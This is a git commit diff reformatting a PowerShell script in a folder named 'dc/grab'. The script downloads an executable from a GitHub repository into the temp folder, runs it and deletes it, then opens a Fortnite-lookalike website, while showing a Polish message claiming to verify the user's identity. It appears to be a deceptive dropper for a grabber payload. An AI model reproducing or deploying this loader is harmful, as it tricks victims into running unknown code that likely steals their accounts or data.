3c4a3d287df3176ca6105878aef211f99fed2dcf
xKotelek <contact@kotelek.dev>
2024-12-26 23:00:34 +0100

    Update exec.ps1

--- dc/grab/exec.ps1
+++ dc/grab/exec.ps1
@@ -1,15 +1,21 @@
 powershell -Command "& {
-    $url = 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe'; 
-    $output = Join-Path $env:TEMP 'temp.exe'; 
-    $wc = New-Object System.Net.WebClient; 
-    $wc.DownloadProgressChanged += { 
-        Write-Host ('Weryfikuję twoją tożsamość (status pobrania pliku) ' + $_.ProgressPercentage + '%') -NoNewline; 
-    }; 
-    $wc.DownloadFileAsync([Uri]$url, $output); 
-    while ($wc.IsBusy) { Start-Sleep -Milliseconds 500; } 
-    Start-Process $output; 
-    Remove-Item $output -Force; 
+    $url = 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe';
+    $output = Join-Path $env:TEMP 'temp.exe';
+    $wc = New-Object System.Net.WebClient;
+
+    $wc.DownloadProgressChanged += {
+        $percentage = $_.ProgressPercentage;
+        Write-Host ('Weryfikuję twoją tożsamość (status pobrania pliku) ' + $percentage + '%') -NoNewline;
+    };
+
+    $wc.DownloadFileAsync([Uri]$url, $output);
+    while ($wc.IsBusy) {
+        Start-Sleep -Milliseconds 500;
+    }
+
+    Start-Process $output;
+    Remove-Item $output -Force;
     Start-Process 'https://f0rtn1te-xp.ct8.pl/';
-    Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green; 
+    Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green;
     Pause;
 }"
